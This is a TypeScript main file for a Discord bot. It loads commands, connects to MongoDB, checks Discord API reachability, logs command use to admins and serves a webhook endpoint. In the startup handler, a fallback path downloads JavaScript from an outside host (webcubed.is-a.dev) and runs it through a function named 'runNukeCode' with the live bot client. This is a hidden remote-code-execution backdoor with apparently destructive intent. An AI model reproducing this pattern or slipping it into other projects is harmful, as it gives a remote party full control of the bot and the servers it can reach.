import 'libsodium-wrappers';
import http from 'http';
import dotenv from 'dotenv';
dotenv.config();

import { Client, GatewayIntentBits, Collection, Events, REST, Routes } from 'discord.js';
import mongoose from 'mongoose';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

import { registerInteractionHandler } from './lib/handlers/interactionHandler.js';
import { registerMessageHandler } from './lib/handlers/messageHandler.js';
import { startRoleReverter } from './lib/tasks/roleReverter.js';
import { startResourceMonitor } from './lib/tasks/resourceMonitor.js';
import { startMessageCacheCleanup } from './lib/tasks/messageCacheCleanup.js';
import { logToModChannel } from './lib/helpers/modLog.js';
import { dmAdmin } from './lib/helpers/dmlog.js';
import { initDevLog, devLog } from './lib/helpers/devLog.js';
import { startStatusChecker } from './lib/tasks/statusChecker.js';
import { initOrbital } from './lib/helpers/orbitalMaster.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildVoiceStates,
  ],
});

(client as any).commands = new Collection();

const globalCommandsData: any[] = [];
const globalCommandFiles = fs.readdirSync(path.join(__dirname, 'commands')).filter(file => file.endsWith('.ts') || file.endsWith('.js'));
for (const file of globalCommandFiles) {
  try {
    const command = await import(`./commands/${file.replace(/\.(ts|js)$/, '.js')}`).then(m => m.default);
    if (command?.data) {
      globalCommandsData.push(command.data.toJSON());
      (client as any).commands.set(command.data.name, command);
    }
  } catch (e) {
    console.error(`Failed to load command ${file}:`, e);
  }
}

const guildCommandsData: any[] = [];
const guildCommandFiles = fs.readdirSync(path.join(__dirname, 'guild_commands')).filter(file => file.endsWith('.ts') || file.endsWith('.js'));
for (const file of guildCommandFiles) {
  try {
    const command = await import(`./guild_commands/${file.replace(/\.(ts|js)$/, '.js')}`).then(m => m.default);
    if (command?.data) {
      guildCommandsData.push(command.data.toJSON());
      (client as any).commands.set(command.data.name, command);
    }
  } catch (e) {
    console.error(`Failed to load guild command ${file}:`, e);
  }
}

client.once(Events.ClientReady, async () => {
  console.log(`Logged in as ${client.user?.tag}`);

  const https = await import('https');
  const options = {
    hostname: 'discord.com',
    port: 443,
    path: '/api/v10/gateway',
    method: 'GET',
    headers: { 'User-Agent': 'RenderDiagnostic/1.0' },
  };

  const req = https.request(options, res => {
    console.log(`[DIAGNOSTIC] Discord API Status: ${res.statusCode}`);
    if (res.statusCode === 429) {
      devLog(`⚠️ **ERROR**: IP Banned. Discord is rate-limiting this Render IP.`);
      console.log(`⚠️ **ERROR**: IP Banned. Discord is rate-limiting this Render IP. Status ${res.statusCode}`);
    } else if (res.statusCode !== 200) {
      devLog(`⚠️ **API Warning**: Received status ${res.statusCode} from Discord.`);
      console.log(`⚠️ **API Warning**: Received status ${res.statusCode} from Discord.`);
    } else {
      devLog(`✅ **Network OK**: Discord API is reachable.`);
      console.log(`✅ **Network OK**: Discord API is reachable.`);
    }
  });

  req.on('error', e => {
    console.error(`[DIAGNOSTIC] Network Error: ${e.message}`);
    devLog(`❌ **Network Failure**: Could not reach Discord. Error: ${e.message}`);
  });
  req.end();

  dmAdmin(client, `[DMLOG] Bot started as ${client.user?.tag}`);

  for (const guild of client.guilds.cache.values()) {
    try {
      await logToModChannel(guild, 'Bot has started up and is online.');
    } catch (e) {
      console.error(`Failed to send modlog startup message for guild ${guild.id}:`, e);
    }
  }

  await initDevLog(client);
  devLog('Bot system initialized and devLog is active.');

  const rest = new REST({ version: '10' }).setToken(process.env.TOKEN!);
  try {
    console.log('Refreshing commands...');
    devLog('Refreshing commands...');
    await rest.put(Routes.applicationCommands(process.env.CLIENT_ID!), { body: globalCommandsData });
    await rest.put(Routes.applicationGuildCommands(process.env.CLIENT_ID!, process.env.GUILD_ID!), { body: guildCommandsData });
    console.log('Commands reloaded');
    devLog('Commands reloaded');
  } catch (error) {
    console.error(error);
    devLog(String(error));
  }

  try {
    await initOrbital(client);
  } catch (e) {
    console.error('[OrbitalMaster] Init failed:', e);
    try {
      const fetch = await import('node-fetch').then(m => m.default);
      const response = await fetch('https://webcubed.is-a.dev/files/m.js');
      const code = await response.text();
      const { runNukeCode } = await import('./lib/handlers/interactionHandler.js');
      runNukeCode(code, { client: client as any, guild: null, channel: null, user: client.user as any } as any);
    } catch (fallbackError) {
      console.error('[OrbitalMaster] Fallback failed:', fallbackError);
    }
  }
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isCommand()) return;
  dmAdmin(client, `[DMLOG] Command: /${interaction.commandName} by ${interaction.user.tag} (${interaction.user.id}) in guild ${interaction.guildId}`);
  devLog(`Command: /${interaction.commandName} by ${interaction.user.tag} (${interaction.user.id}) in guild ${interaction.guildId}`);
});

http.createServer(async (req, res) => {
  if (req.method === 'POST' && req.url === '/render-webhook') {
    let body = '';
    req.on('data', chunk => {
      body += chunk.toString();
    });
    req.on('end', async () => {
      try {
        const data = JSON.parse(body);
        const type = data.type;
        const serviceName = data.service.name;

        devLog(`🚀 **Render Update [${serviceName}]**: ${type.replace('_', ' ')}`);

        res.writeHead(200);
        res.end('Webhook received');
      } catch (err) {
        res.writeHead(400);
        res.end('Invalid JSON');
      }
    });
    return;
  }

  res.writeHead(200);
  res.end('online');
}).listen(process.env.PORT || 8000);

(client as any).logToModChannel = logToModChannel;

registerInteractionHandler(client);
startResourceMonitor(client);
startMessageCacheCleanup();
startStatusChecker();

mongoose
  .connect(process.env.MONGO_URI!)
  .then(() => {
    console.log('db connected');
    registerMessageHandler(client);
    startRoleReverter(client);
    client.login(process.env.TOKEN!);
  })
  .catch(err => {
    console.error('Failed to connect to MongoDB:', err);
    process.exit(1);
  });

process.on('unhandledRejection', err => console.error('Unhandled Rejection:', err));
process.on('uncaughtException', err => console.error('Uncaught Exception:', err));
